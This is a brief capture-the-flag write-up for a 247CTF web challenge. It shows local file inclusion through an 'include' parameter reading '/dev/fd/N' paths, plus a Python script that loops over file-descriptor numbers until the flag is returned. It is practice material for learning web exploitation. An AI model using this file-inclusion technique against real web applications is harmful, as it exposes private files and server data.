# Discussion

We have opened the flag, but forgot to read and print it. Can you access it anyway?

## Hmm

I have no idea, but see that =))

![1](https://user-images.githubusercontent.com/104124377/165557935-79a4a049-ee59-4ac8-8a37-4c4ededfc31e.png)

Oh, he means when the file is opening, we can access the file on the system with side path /proc/self/fd/num_of_file_is_opening

But how to access file in sever?

```url
https://55ba6d8a8d230124.247ctf.com/?include=/proc/self/fd/1
```

### Is that?

"/proc/self/fd/num"
No, it's longer than 10 characters.

### So how to handle this problem?

With few google searches =)) I found it

![2](https://user-images.githubusercontent.com/104124377/165558019-9a06eb50-cfc1-4677-867d-918996c59a11.png)

```url
https://55ba6d8a8d230124.247ctf.com/?include=/dev/fd/num_of_file_is_opening
```

### To be faster, i wrote a python program

```python
import requests

target = "https://55ba6d8a8d230124.247ctf.com/?include=/dev/fd/"

for i in range(100):
    print("Running with index", i)
    flag = requests.get(target + str(i))
    if "247" in flag.text:
        print(flag.text)
        break
```

## yeahh, i got the flag

![3](https://user-images.githubusercontent.com/104124377/165558095-087157e6-66cb-43d5-9741-0b8d6b2fc6a9.png)

## That's all. Thanks for reading
